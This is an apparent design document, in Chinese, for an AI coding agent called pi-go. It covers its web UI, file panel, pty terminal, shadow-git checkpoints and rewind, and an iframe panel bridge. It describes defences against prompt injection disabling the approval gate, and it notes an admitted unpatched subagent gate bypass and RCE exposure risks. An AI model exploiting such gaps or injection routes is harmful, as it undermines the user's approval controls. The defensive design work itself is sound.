8. **`web/ui/dist` 被 embed，所以它进版本库**（§10.10）。

### 服务端

9. **`tool_result` 必须与 `tool_use` 一一配对且同序**，取消时也要凑齐。
10. **`Details` 绝不进 LLM 上下文**，但要进会话文件。它挂在 `llm.Block.Details` 上，靠 `convert.go` 逐字段构造 wire 结构体来保证上不去 —— 别把那里改成整体 marshal。
11. **运行中不能读 `agent.Messages()`** —— data race。UI 要的消息一律从 Hub 拿。
12. **终止事件必须阻塞发送**（`emitFinal`）。约一半概率丢掉 `agent_end` → 界面永远转圈。
13. **杀子进程要杀整个进程组**，否则取消一轮后 `go test` 还在跑。
14. **可重置 timer 不要在 `for` 里 `defer t.Stop()`。**
15. **不要引 `errgroup`。**
16. **per-path 锁的 key 必须 canonical 化。**

### 安全

17. **`bash` 没有路径限制。** Web 暴露出去等于 RCE 即服务，所以默认 loopback + token + 同源。
18. **斜杠命令绝不能从模型输出或文件内容解析**（prompt injection）。
19. **不要做 bash 命令前缀白名单**（§8.4）。
20. **危险模式表只用于高亮**，唯一的行为效果是禁止「始终允许」。
21. **`-p` 永远不能有闸门**，且 §8.10 的 subagent 漏洞未堵。

---

## 15. 未完成的工作

### 15.1 功能缺口

| 缺口 | 说明 | 量级 |
|---|---|---|
| subagent + `-p -format json` | 零代码（§12），实现时必须堵 §8.10 | L |
| ~~会话树 / fork~~ | **已落地**，但不是当初设想的分支可视化：`Store.Fork()` 由**撤回**（§18）使用，被放弃的分支从 head 不可达而不画出来。「让人看见并在分支间跳转」仍然没做 | — |
| 多标签页会话列表同步 | 策略是广播的，会话列表不是（只在新建/发送/删除时刷新） | S |
| 落盘 per-turn | 进程在 run 中途被 kill 会丢这一轮，根因见雷区 11 | M |
| 键盘可达性 | 侧栏会话是 `<li @click>`，键盘和读屏器到不了。按钮和 `ModelPicker` 都是原生元素，没问题 | S |
| 深色模式 | `color-scheme: light` 写死 | S |
| bundle 体积 | 单块 1.1MB，Element Plus 全量导入但实际只用了 `ElMessageBox`（删除确认 + 重命名输入）。改按需导入能省一大半，但要留意组件样式依赖它的 CSS 变量 | S |
| 组件测试 / E2E | 现在 30 个用例全是纯逻辑（时间线折叠、SSE 回放、tokenizer），组件渲染没有自动化覆盖 | M |
| `retry` 提示 | 事件接上了（顶栏一行），但没在真实限流下看过 | — |

### 15.2 待人工验证的界面清单

服务端和纯逻辑都有自动化覆盖，但**界面没有被人眼看过**。这份清单是 W5 的起点：

- [ ] 问一句需要读写文件的问题，看时间线（思考折叠 / 工具调用 / 回答）是否清楚
- [ ] `edit` 的 diff 渲染正确（行号、增删配色、超过 28 行折叠）
- [ ] bash 弹审批卡：**批准** / **拒绝** / **改写后批准** 三条路径
- [ ] 审批卡待决时**刷新页面**：卡还在、倒计时接着走
- [ ] 运行中刷新：已有内容还在、继续实时更新
- [ ] 运行结束后刷新：界面不卡在「运行中」（雷区 2）
- [ ] 往上翻历史时不被拉回底部；回到底部后恢复跟随
- [ ] `/auto 3` 到期提示、PolicyPicker 的橙色 auto 态与剩余轮次
- [ ] 两个标签页开同一会话：都能看到同一份流；A 页在跑时 B 页发送被拒
- [ ] 长 bash 输出（几千行）时页面是否还流畅
- [ ] 文件面板：树展开/折叠不丢状态、预览（代码高亮 / 图片 / md 预览切换 / 二进制拒显）、⌘P 搜索打开
- [ ] 面板内编辑：改几行保存；另开编辑器动同一文件再保存 → 409 冲突条 → 覆盖/放弃两条路径
- [ ] 改动 tab：本会话按轮分组、统一/双栏切换、工作区累积 diff、清空基线两步确认

---

## 16. workspace 文件面板（M1–M5 已全部落地）

右上角按钮打开右侧滑出面板（镜像左侧栏的收起机制），GitHub 式文件管理 + Codex 桌面版式改动可视化。设计前有竞品实据调研（Codex 开源仓库 app-server 协议、Claude 桌面版 checkpointing 文档），关键决策的记录：

> **这条决议的边界后来变了一次，读之前先看清：** 它管的是**改动追踪**，那件事到今天仍然不碰 git。而**整树快照**（checkpoint / 撤回）后来走了 git 的路——见 §18.2，那里解释了为什么这不是反悔而是两件事。

**单一改动数据源，不碰 git。** Codex 的双轨制（`git diff` 整体视图 + `TurnDiffTracker` 内存快照）会因两者对不上而被报 issue（openai/codex#31157）；Claude 的 checkpoint 是 Edit/Write 前的**内容快照**（`~/.claude/file-history/`，按 prompt 分组、留 100 个、resume 可用），明确不依赖 git。pi-go 走快照路线：改动追踪 = edit/write 的 details（事件流和会话文件里都有）+ 累积基线靠 file journal（M4，edit.go/write.go 读原文处插 `BeforeChange` 钩子）。

**watcher 不做。** Codex 的 fs/watch 是它 issue 最密集的区域（不刷新、卡死、百万 inotify watch），且引入 fsnotify 违反 stdlib-only。刷新 = SSE `tool_end` 事件驱动（agent 改的自己看得见）+ 手动刷新按钮；外部编辑器改动不追（Claude 同样声明 "External changes not tracked"）。

**side-by-side 走 patch 文本。** DiffView 吃的是 Go 预渲染的折叠单栏文本，行号/省略行已丢对齐信息，救不回双栏；但 `details.patch`（git 标准 unified，有 `TestUnifiedPatchAppliesWithGit` 背书）一直在 wire 里。前端写一个 patch→rows 解析器（hunk 结构照 Claude SDK 的 `structuredPatch` 命名），per-edit 卡片和工作区累积共用一份。

**raw 预览只放 image/*。** 内容端点与页面同源，若原样吐出 HTML 就能以页面身份读到 sessionStorage 里的 token——`raw=1` 因此只服务嗅探为 `image/*` 的响应并带 `nosniff`，其余 415。

**大 diff 限制渲染不限制导航**（Codex #25137 的教训）：文件列表永远完整，超大 diff 退化为统计行。

**里程碑**：M1 只读 API（✅ 本节三个 `/api/files*` 端点 + `tools.Resolve` 导出 + 测试）→ M2 面板+树+预览（✅ `FilesPanel.vue`/`FileTree.vue`/`FilePreview.vue`：顶栏文件夹按钮开合（`pi-go:files-open` 持久化）、宽度拖拽（`pi-go:files-width`）、懒加载树（listings/展开态在 `fileTreeStore.ts` 模块级，折叠不丢）、整面板切换预览（文本走 CodeBlock、图片走 raw、md 有预览/源码切换、二进制拒显））→ M3 会话改动 tab（✅ `ChangesView.vue` + `agent/changes.ts`：纯前端从 timeline 按「第N轮」聚合，零 Go 改动；create/edit/delete 徽标 + ±统计 + 每文件逐次 diff 卡片（新建文件的 write 也带统计——每行都算新增，`write.go` 对 created 也跑 `diff.Stat("", content)`）；统一/双栏切换——双栏由 `agent/patch.ts` 把 `details.patch` 解析成对齐行，`SideBySideDiff.vue` 渲染；解析器测试的 fixture 是 Go `diff.Unified` 的真实输出）→ M4 journal + 工作区累积 diff + side-by-side（✅ `tools/journal.go`：`DirJournal` 按 cwd 作用域存首次改动前的 pre-image（单文件 >1MB 只记统计、总量 256MB LRU 淘汰、tmp+rename 原子写、`ForSession(sid)` 归属），edit/write 在文件锁内读完原文后调 `BeforeChange`；manager 每服务器一个 journal、逐会话注入；`/api/workspace/changes|diff|journal/clear` 三个端点，bash 删除的文件显示为 D、内容被还原的自动消失；前端改动 tab 加「本会话/工作区」作用域切换，工作区累积 diff 与 per-edit 共用同一个 patch→rows 双栏，「清空基线」是两步内联确认不是 modal；工作区列表跟随本会话的 tool_end 自动刷新）→ M5 面板内编辑 + quick open（✅ `PUT /api/files/content`：mtime 乐观并发（409 带 current_mtime_ms）、同目录 tmp+rename 原子替换并保留权限位、保存过 journal 进工作区改动集、二进制/NUL 拒绝、截断文件不给编辑（截断内容写回等于悄悄截肢）；FilePreview 编辑模式 409 → 覆盖保存/放弃修改两选；`QuickOpen.vue` + `agent/fuzzy.ts`：⌘P/Ctrl+P 只在面板打开时拦截，子序列匹配（连续命中 + 段首加权、同分短路径优先、前 50 条），索引首次打开时拉取、刷新即失效）。**M1–M5 全部落地**。

**已知边界**（与两家竞品一致）：bash 命令改动、外部编辑器改动不进改动集；状态只有 create/edit（edit/write 删不了文件）；subagent 子进程的改动默认不进 journal（M4 时经 `PI_GO_JOURNAL_DIR` 环境变量尝试接入，接不上维持此声明）。

**文件类型图标**（`fileIcons.ts`，文件树/QuickOpen/改动列表共用）：图标数据用 vscode-icons 全集（Iconify JSON，1171 个 `file-type-*`），`?raw` 内联成字符串、模块加载时 `JSON.parse` 一次——不走 JSON module 是因为 vue-tsc 会给 3.6MB JSON 生成字面量类型直接拖垮构建，且运行时才决定查哪个图标也无法 tree-shake。解析顺序：特殊文件名（Dockerfile/go.mod/.gitignore/各 lock 文件…）→ `.env*` 与 `prettier/eslint/vite.config…` 等包含规则 → 扩展名别名（ts→typescript、pdf→pdf2、dart→dartlang…）→ `file-type-<ext>` 直查 → 类别组（图片/音频/视频/压缩包/字体/二进制）→ `default-file`。文件夹不用 vscode-icons 的褐色，统一用内联的 flat 黄色文件夹（flat-color-icons 的两个 SVG body，#FFA000/#FFCA28），目录名颜色也不再染蓝。

---

## 17. 会话内终端（pty）

`GET /api/sessions/{sid}/terminal` 升级成 websocket，接一个跑在**该会话工作目录**里的登录 shell。它回答的是文件面板回答不了的那半个问题：agent 在改我的文件，让我自己也去那个目录里敲两条命令。

这是 Go 侧唯一破了 stdlib-only 的地方：`creack/pty` 开 pty，`nhooyr.io/websocket` 传帧。手写 pty 的 ioctl 加一个够用的 websocket 实现，不是「零依赖」该付的价——而且这个代价被限制在这一个文件加 `server.go` 的升级处。

**帧只有一种形状**，两个方向共用：`{type: "in"|"out"|"resize"|"exit", data?, cols?, rows?, code?}`。`data` 是原始终端字节，以 JSON 字符串承载——UTF-8 安全，不付 base64 的税。

### 17.1 shell 的寿命属于会话，不属于连接

关标签页、切会话、网络抖动都只是 detach。下一次 attach 会**重放 backlog 环**，所以一个跑了一半的 `make` 回来时还在滚。shell 只随会话消失（淘汰 / 删除 / 关服务）或用户自己敲 `exit`——之后下一次 attach 会开一个新的。

这条和 §7.1 的「运行的寿命属于会话」是同一个决定的第二次应用：**发起和订阅解耦之后，长期存在的东西就都不该挂在连接上。**

- **backlog 上限 256KB。** 几屏噪声很大的构建输出都装得下；再多客户端自己有 scrollback。
- **同时只有一个视图。** 第二个客户端 attach 会把第一个踢掉（`StatusGoingAway`，理由 "replaced by a newer view"）。最新那个窗口才是用户真正在看的那个；两个视图共享一个 pty 只会互相打断彼此的输入。
- **重放先于实时。** attach 的第一件事是把 backlog 写出去，这样重绘落在新输出**下面**而不是后面。
- shell 取自用户自己的 `$SHELL`（缺省 `/bin/zsh`），环境原样继承，只额外设 `TERM=xterm-256color` 和 `COLORTERM=truecolor`。比这更少都会让它在用户已有的终端旁边显得是坏的。

### 17.2 并发面

四把锁，各自守一件事，命名上写清了为什么不能合：

| 锁 | 守 | 为什么单独一把 |
|---|---|---|
| `wmu` | 写 pty | 击键和 resize 会在另一个 goroutine 重放 backlog 的中途到达 |
| `cmu` | 写连接 | pump 和 backlog 重放会交错帧，而 websocket 库禁止这样 |
| `backlogMu` | 环缓冲 | pump 是唯一读者也是唯一写者，但 attach 要拷一份 |
| `mu` | 附着关系与尺寸 | **读循环和 Kill 都不碰它**，所以一个慢客户端永远不会阻塞输出 |

`detach` 只在「附着还是自己那一个」时才摘除：一个替换进来的连接，不能被它替掉的那个连接先跑完 defer 给摘掉。

### 17.3 关闭时杀进程组

`Kill` 关 pty master（让 pump 失败）、然后 `syscall.Kill(-pid, SIGKILL)`。**杀组不是杀进程**：shell 启动的 dev server 是它的进程组成员，只收割组长会把它们变成孤儿被 init 收养。这和 `tools/procgroup_unix.go` 里取消一轮 bash 的处理是同一条规则、同一个理由。

### 17.4 安全

**这一节把 §8.1 的话说完了：一个未加认证的实例等于把 shell 作为服务开放出去。** token 中间件像管其他 `/api` 路由一样管住升级请求，Origin 中间件在升级之前就已经跑过（所以 `websocket.Accept` 不需要再查一遍）。

而**闸门在这里完全不在场**，这是有意的：闸门管的是模型，这个 shell 是用户自己的手。`bash` 工具本来就没有路径限制（§8.1），这里连那层「防手滑」都没有——它本来就不是给模型用的。

---

## 18. 撤回（rewind）与 checkpoint

时间线上任何一条**用户消息**都可以撤回。`rewind` 有两档，`rewind_preview` 用来在问人之前把代价算出来。

### 18.1 对话：分叉，不是删除

撤回把那条消息、回答它的每一轮、以及之后的一切，都变成**从 head 不可达**。transcript 是 append-only 的，所以什么都没有被删除——旧分支还在文件里，只是没有人从 head 走得到它。

**运行中不允许撤回**（`ErrRunActive`）。否则 loop 会继续往一条没人看得见的分支上追加。

### 18.2 文件：影子 git 仓

对话之外可以要求把工作区**恢复到那条消息发出时的状态**：改过的回去、删掉的回来、之后新建的被移除。做法是每次 run 开始前对整个工作树打一次快照，存进一个**影子 git 仓**。

**这和 §16「单一改动数据源，不碰 git」不矛盾，但必须讲清边界，否则读起来像反悔。** §16 那条决议管的是**改动追踪**——「这次会话改了哪些文件、每处 diff 是什么」——那件事到今天仍然不碰 git，数据源是 edit/write 的 details 加 file journal。checkpoint 要的是另一件事：**整棵树在某一时刻的样子**。而那件事上快照路线反过来赢了，理由是 §16 自己「已知边界」那一段承认的两个洞：

> bash 命令改动、外部编辑器改动不进改动集

一份整树快照恰好能抓住 per-file 钩子抓不到的东西：bash 写的、删除、重命名。所以两件事用了两种机制，而不是一件事改了主意。这也是市场收敛的位置——Codex 的 ghost commit、Gemini CLI 的 `~/.gemini/history`、Cline 的 per-task 影子仓，都是整树快照。

四条实现约束：

- **影子仓在会话目录下，永远不在工作区里**（`<session-dir>/checkpoints/<项目键>/`，bare 仓 + `--work-tree` 指向工作区）。两个后果都是要的：**工作区不需要是 git 仓库**，而如果它是，**用户自己的 git 历史一个字都不会被碰**。
- **checkpoint 用 run 开始那一刻 transcript 的 head 记录 id 命名**（`refs/checkpoints/<recordID>`）。而撤回的分叉点恰好就是这样一个记录 id——**这就是两棵树的连接键**：对话在 JSONL 里分叉，影子分支在这里分叉。没有第二套 id 需要对齐。
- **失败模式永远是「不可用」，绝不是「阻塞」。** 没有 git、目录不可写 → `NewShadowRepo` 返回错误，checkpointing 关掉而不是服务器起不来；某个点的快照没落上 → 那个点只能撤对话，`errFilesUnavailable`。**run 从不因为快照失败而不跑。**
- **一个 index 只能有一个写者**，所以所有改动型操作在 `mu` 上串行，并发会话排队而不是把 index 弄坏。

### 18.3 恢复要预览并询问，不猜

快照分不清「agent 改的」和「checkpoint 之后用户自己改的」。所以 `rewind_preview` 先跑一遍 `git` 的 name-status，把要动的文件列出来：

| Status | 含义 |
|---|---|
| `M` | 恢复 |
| `D` | 找回（被删掉的回来） |
| `A` | 删除（checkpoint 之后新建的） |

`Added`/`Removed` 是**这次恢复本身**会增删的行数——和 Status 描述的后果对齐，不是那次改动的行数。二进制文件报 `-1`，界面显示「二进制」而不是编一个行数。对话框明说：**之后新建的文件会被删除，这之后你手动的改动会被覆盖。**

### 18.4 全有或全无

`Restore` 先跑、`Fork` 后跑，**同一把锁**。所以恢复失败就完全不动对话，而且中间没有缝隙能让一次 run 挤进来。

`reset --hard` 之后还要跟一个 `clean -fd`：reset 不管未跟踪文件，而被放弃的那次 run 新建的文件正是未跟踪的——**放过它们的撤回只撤了一半**。被 ignore 的路径留着，那正是 ignore 它们而不是删掉的意义。

影子分支随恢复一起回退，所以之后的 checkpoint 从恢复后的状态分叉——和 transcript 的分叉对上。

### 18.5 快照的预算与撤回点的保留期

前面四节讲的是**一次**快照怎么打、怎么恢复。这一节讲**总量**：一次快照可以多大，总共留多少个。这两个数在 18.1–18.4 落地时都没有答案，而「没有答案」在这里的实际含义是**无界**——每次 run 开始打一次快照、`--allow-empty` 保证 ref 一定前进、且没有任何代码删过 ref。会话被淘汰也不会带走它的 checkpoint。

竞品都给了界：Claude Code 每会话留 100 个快照 + 30 天保留期（`cleanupPeriodDays` 可调），Codex 留最近 15 个 managed worktree（删除前先存快照），Cursor 干脆不跨 IDE 重启保留。

**体积预算：512MiB 新增内容 / 2 万个新文件。** 超了**不打快照**——run 照跑，stderr 报出最大的几个目录。三个决定：

- **判断交给 git，不自己走目录树。** `git ls-files --others --exclude-standard` 列出的正是 `add -A` 会 stage 的东西，它同时尊重工作区的 `.gitignore`、每一层嵌套的 `.gitignore` 和影子仓的 `info/exclude`。自己走一遍的版本会在一个 2GB 的构建目录上关掉 checkpoint，而 git 本来就要 ignore 它——把「预算」变成「误报」。
- **只量未跟踪的路径。** 已跟踪的内容已经付过了，重新量它会把一次性的拒绝变成永久的拒绝。
- **量不出来不算超。** `ls-files` 失败时放行：预算是防磁盘开销的护栏，不是安全前提。这和 18.2「失败模式永远是不可用、绝不是阻塞」是同一条规则的第二次应用。

诊断必须点名最大的贡献者（按顶层条目聚合），因为那是人能动手的单位——一条 `.gitignore`、一次目录搬迁。只报一个数字等于让人无从下手。

**噪声清单是 `indexSkip` 的超集，不是同一份。** 两份清单回答的是不同问题：索引那份问「这会不会在 quick open 里淹掉项目自己的文件」，这份问「每次 run 快照它要花多少真实磁盘」。所以包管理器目录与工具缓存加在这边。

**`build/` 和 `target/` 故意不加。** 两个都是约定的产物目录，也都在某些项目里是手写源码，而猜错的代价是**静默**的：一次撤回跳过了一个没人被告知的文件。名字只在「这个名字永远不是源码」时才配进清单；剩下的交给体积预算——**用量的，不用猜的**。

**保留策略：100 个撤回点或 30 天，先到先算。** 由 `-checkpoints-prune` 执行，**做成命令而不是后台定时清扫**——和 `-worktrees-prune` 同一个理由，那条理由写在 `worktrees.go` 顶上：pi-go 没有常驻进程，两次调用之间什么都不跑，所以诚实的选项只有「有人来问的时候」和「永不」；定时清扫意味着在一次无关的 run 里删掉别人的撤回点。Claude Code 和 Codex 能定时扫是因为它们长驻。

保留的数字**不做成 flag**。一个旋钮需要有被转动的理由，而「一百个点或三十天」对每个项目都是同一个答案。等有人拿出一个能证伪它的工作区，再加那个 flag。

**清理必须重写幸存者，否则一个字节都释放不出来。** 这是最容易做错的一半：每个 checkpoint 提交都以前一个为父，**分支把整条链拴在一起**。删掉旧 ref 之后，某个更新的提交仍然把它列为祖先，对象照样可达，`gc` 什么也不会丢。所以 prune 在同样的 tree 上重建一条新链——**ref 名不变，commit id 变**——之后 `gc --prune=now` 才真的能丢掉只有被删除的点引用过的对象。`refs/heads/main` 必须跟着走，否则被放弃的旧链从分支这一侧仍然可达；幸存者为零时直接删掉分支，下一次 run 从头开一条历史，它快照的工作树两种情况下都是同一个。

改 commit id 是安全的，而这一点正是 18.2 那条设计撑起来的：**和 transcript 的连接键是 ref 名，不是 commit id**，`Preview` 和 `Restore` 每次都重新解析这个名字。

**排序不能用提交时间——这是实测踩到的坑，不是推演。** git 时间戳只有秒精度，六个连续的 checkpoint 会带着同一个 `committerdate`，`--sort=-committerdate` 于是静默退化成按 ref 名排序：`keep=2` 保留了 `rec0`、`rec1`，丢掉了 `rec4`、`rec5`——保留策略的精确反面，而且输出里的「removed 4, kept 2」看起来完全正常。真正的顺序是提交链本身（每个 checkpoint 以前一个为父），`rev-list --all --topo-order` 保证子提交排在父提交之前，一次调用就给出覆盖所有撤回点的全序，包括被某次恢复放弃在旁支上的那些。年龄规则用 `<=` 而不是 `<`，同一个秒精度的理由。

**顺带被这套设计免掉的一类事故。** 18.2 说的是「不碰用户的 git 历史」，还可以说得更硬：影子仓是 `--git-dir` + `--work-tree` 的 bare 仓，**从不碰工作区的 `.git`**。Cline 的 checkpoint 为了打快照会把工作区的 `.git` 临时改名成 `.git_disabled`，进程被中断或崩溃时没改回来，于是损坏用户仓库、submodule 报错（cline/cline#4388）。那一整类事故在这里不存在，不是因为处理得好，是因为没有那一步。

---

## 19. 外部面板（-web-panel）与 dock sheet 化

场景应用（如恶意代码分析平台）需要自己的数据页面，而基座的 UI 不该长领域页面。业界 2025–2026 的收敛答案（ChatGPT Apps SDK / MCP Apps 官方扩展 / VS Code webview）：**宿主从不实现领域 UI，它提供通用的展示槽**——沙箱 iframe + 同源反代。pi-go 的实现：

**注册与代理。** `-web-panel 名称=url`（可重复）在启动时注册，经校验（名称不含 `/=`、URL 必须绝对 http(s)）。服务器挂两条路由：`GET /api/panels`（只报名字和 `/panels/<名称>/` 路径，后端 URL 不外泄——内部拓扑是服务器自己的事）和 `/panels/{name}/*` 的反向代理（`Rewrite` 剥前缀，裸 `/panels/<名称>` 301 到带斜杠，让相对链接落在前缀下）。代理模式复用 `-web-dev` 那套单源思路：面板与页面同源，Origin 中间件天然覆盖，不开 CORS。

**鉴权边界（与页面同一套理由）。** 面板内容**不过** token——页面和静态资源也不过，因为它们都是内容而非操作；`/api/panels` 过，因为它是 `/api`。两条推论写进了 `Panel` 的 doc：面板后端有写操作就自己做鉴权；只注册可信后端——同源 iframe 能读到父页面 URL 里的 token，所以这把注册旗标和 `-skill` 一样是运营者的显式信任决定。

**dock 从双排改成 sheet 容器。** 原「文件在上、shell 在下（或左右）」的双栏模型退役，换成常显的 40px 图标栏 + 一次只显示一个 sheet，点当前图标收起。旧 localStorage（`pi-go:files-open`/`shell-open`）一次性迁移到 `pi-go:active-sheet`，拆分比例等几何键保留。

**图标栏固定为两颗（v2）。** 第一版让每个注册的面板各占一颗图标，结果 rail 上「文件」「Shell」和一个四页数据应用并列——前两者是**运行时自身的状态**（agent 在哪干活、它跑的命令长什么样），后者是**领域内容**，分类错了，所以看着违和。修正后 rail 是 chrome，恒定两颗：

- **文件**保留独立按钮——高频、长驻、要和对话并排看，降级进容器会给最常用的操作多加一次点击；
- **面板**是一个容器（`hub`），Shell 和每个 `-web-panel` 都是它的**住户**，由标题栏左侧的下拉切换。注册再多面板也不会改变 rail。

这是浏览器侧边栏模型而不是 VS Code 活动栏模型：Chrome 的 Side Panel 就是「一个区域 + 头部下拉选占用者」，而 VS Code 走的是多图标 + 视图可拖拽。代价是单颗按钮丢了一眼可辨的身份，缓解办法三条：收起时显示通用面板图标、展开时改为显示当前住户的图标（收起状态下会变的图标会让人以为按钮每天干不同的事）、tooltip 带住户名。

状态是 `pi-go:active-sheet`（`files` / `hub`）加 `pi-go:hub-tenant`（`shell` / `panel:<名称>`）。`migrateSheet` 把历史上写过的每个值都折叠到这两个 sheet 上，并且**幂等**——降级再升级不会把人卡在一个不存在的 sheet 上；来自更新版本的未知值一律开不开任何 sheet，因为收起状态从 rail 就能恢复，而猜测会打开用户没选过的东西。住户记不住了（某个 `-web-panel` 从命令行去掉了）就回落到第一个住户，不留空白面板。

hub 标题栏还有一颗**最大化**：force graph 或宽表格值得临时占满宽度。它是对「对话区永不低于一半」那条硬下限的显式临时覆盖，只在 hub 生效，且**不持久化**——下次启动出现一个盖住对话又没有解释的面板，比多按一次键糟得多；切走 sheet 时自动清除。

**postMessage 桥（v2 已实现）。** 面板→对话的联动落地了：面板发一条消息，pi-go 把文本填进输入框。线上格式直接用 **MCP Apps（SEP-1865）的 `ui/message`**——JSON-RPC 2.0 over postMessage，`params.content = {type:"text", text}`。选标准而不是自造，是因为这套东西正是为「iframe 里的界面和宿主对话」设计的，ChatGPT 的 Apps SDK 也说同一种话；将来真要长成 MCP Apps host，面板那一侧不用改。带 `id` 的请求会收到 `{result:{}}` 回执。

监听放在 `DockArea` 而不是视图里，因为两条要紧的校验都需要 iframe 元素本身：

1. `event.origin` 必须等于本页 origin——面板是同源反代进来的，别处来的就不是面板；
2. `event.source` 必须是这个 iframe 的 `contentWindow`——只看 origin 会把页面自己和任何其他同源 frame 也放进来；面板没开就没有桥，失败即关闭；
3. 载荷当不可信数据：只取 `content.text`，永不变成标记；
4. 回执写明目标 origin，不用 `*`；
5. 方法白名单只认 `ui/message`，`role` 不是 `user` 一律拒绝——不让面板替 assistant 说话。未知方法打一条 warn，但 `not-rpc` 静默，因为同源页面本来就有大量无关的 postMessage 流量（vite、xterm、扩展）。

要说清楚这几条防的是什么：面板跑在页面的 origin 里，本来就被信任到「能拿到这个页面持有的 token」那种程度，所以校验**不是**让一个恶意面板变安全，而是让一个**无关的 frame** 没法替面板说话。真要托管不可信面板，得按 MCP Apps 规范换独立沙箱源——那正是同源反代这条路刻意不去做的事。

**策略与解析分离。** 桥只产出意图，怎么落地由 `composerIntent` 决定：面板意图**永远只填入、绝不代发**。理由是 pi-go 自己的立场——面板是内容，服务端连 token 都不要求它带；能自己花掉一次模型调用的内容，就不再是内容了。填入时若 hub 正最大化会自动还原，否则用户会填进一个看不见的输入框。

**什么不在这里面：** subagent 事件 sheet 化是这条框架预留的下一个住户；侧边聊天（在 hub 里开第二个并行会话）需要把对话区抽成可复用组件，且业界经验表明窄面板里的多聊天 tab 是问题高发区，所以定位为单实例、不做 tab，单独排期。

---

## 20. 空态引导与后续建议（starters.json）

空对话是通用 agent 和其他所有 agent 长得最像的一屏：一个空输入框同时表达「无限可能」和「零方向」。而 rail 归了 chrome 之后，**领域的门面就该落在这里**——它按会话重来、与上下文相关、天然承担「这个 agent 能替我做什么」。

**内容由部署方给，不写进 UI。** pi-go 不认识恶意代码，也不该认识。卡片来自 skill 目录里的 `starters.json`，与「领域性只在 skill」一致，还跟着 skill 一起版本化、一起用 `-v` 挂载迭代。没有 skill 提供时，空态回退到原来那行 hint，裸 pi-go 零回归。

**每请求重读**，所以改完 `starters.json` 刷新页面即生效——和 `/skill:name` 重读指令是同一个理由。文件很小，且这个接口一次页面加载只取一次。

**动词只有两个**：`prompt`（把文本放进输入框）和 `panel` + 可选 `at`（打开某个 dock 面板，可带 hash 路由）。词汇表保持这么小，是为了不让 `starters.json` 长成一门驱动 UI 的语言。

**字段形态抄了成熟做法**：`title` + `label` + `prompt` 的三段结构、3–6 张的数量区间、「点击是填入还是直接发送」由配置决定，都是 suggestion API 已经收敛的答案（assistant-ui 的 Suggestions、Custom GPT 的 conversation starters、Copilot Studio 的 suggested prompts）。`send` 默认 **false**：pi-go 别处的规则是从不替用户说话（编辑消息是回填而不是重发），想要一键演示的部署显式打开。

**校验在加载时就报，不在运行时沉默。** 未知字段直接判文件不合法——把 `cards` 拼成 `prompts` 会渲染出一张什么都不做的卡片，而作者根本分不清是自己拼错还是 UI 有 bug。逐卡片的规则：标题必填且有长度上限、两个动作互斥、`icon` 必须来自白名单（否则等于让一个 JSON 文件递交页面标记）、`at` 必须以 `#/` 开头。坏卡片逐张跳过并各自说明原因，好卡片照常显示；整份文件坏掉就退回内置 hint——一个坏文件应该只损失一个特性，不该损失整页。

`prompt` 不能是 slash command：那道防线防的是一行注入关掉审批门，与文件是谁写的无关。`/skill:name` 是例外，它是会展开的提示而不是会执行的命令。面板名是否真的注册过由 web 层核对（skills 包不知道有哪些面板），点了没反应的按钮比少一张卡更糟。

**后续建议（followups）** 是同一份文件里的第二块：一轮结束后在对话尾部浮出下一步，渲染成 chips 而不是卡片——空态有整屏可以介绍 agent，chips 坐在用户还在读的答案下面，不能跟它抢注意力。

两个决定都是为了不烦人：

1. **确定性，不让模型生成。** 后续建议最不该做的事就是让回答显得更慢；问模型该建议什么会在**每一轮**都花掉一次调用并增加延迟。skill 声明条件，匹配是一次字符串查找：零延迟、零额外调用、零额外花费。顺带也避开了反应式生成导致对话漂移的问题。
2. **相关才显示，否则沉默。** `when` 只匹配**最后一轮**做了什么（工具调用名 + 参数 + 回复文本，拼起来截断并小写）。只看最后一轮是因为放到整段对话上，一个命令出现过一次就会一直匹配，chips 就不再描述刚刚发生的事。没命中就什么都不显示——固定一排 chips 会在用户刚问完家族画像时建议「反编译它」，而一半时间不对的建议会训练用户忽略这一行。

命中第一组即停，不叠第二行；文件顺序就是作者的优先级声明。运行中和有审批门等待时都不显示：让建议和审批卡同屏，等于要求用户同时做两件事，而其中一件正卡着 agent。
